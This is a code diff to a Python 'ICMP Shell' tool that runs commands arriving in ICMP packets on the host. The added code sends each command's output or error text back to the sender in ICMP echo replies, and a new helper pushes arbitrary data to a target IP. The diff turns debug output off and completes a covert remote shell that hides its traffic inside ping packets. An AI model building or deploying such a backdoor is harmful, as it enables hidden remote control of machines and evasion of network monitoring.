@@ -8,7 +8,7 @@ import signal
 import subprocess
 
 from scapy.layers.inet import ICMP, IP
-from scapy.sendrecv import sniff
+from scapy.sendrecv import sniff, send
 
 import ish_open
 import ishell
@@ -81,13 +81,25 @@ def packet_callback(packet):
         os.close(child_conn)
         process.communicate()
 
-        # print(output.decode('cp866'))
-        # print(error.decode('cp866'))
-        # print(f"Data: {packet[ICMP].payload.load.decode('utf-8')}")
+        output = output.decode('cp866')
+        error = error.decode('cp866')
+        print(output)
+        print(error)
+        if output == '':
+            reply_packet = IP(src=packet[IP].dst, dst=packet[IP].src) / ICMP(type=0) / error
+            send(reply_packet)
+        else:
+            reply_packet = IP(src=packet[IP].dst, dst=packet[IP].src) / ICMP(type=0) / output
+            send(reply_packet)
+
+
+def send_icmp_with_data(target_ip, data):
+    packet = IP(dst=target_ip) / ICMP() / data
+    send(packet)
 
 
 def main():
-    ish_debug = 1
+    ish_debug = 0
 
     parser = argparse.ArgumentParser(description='ICMP Shell')
 
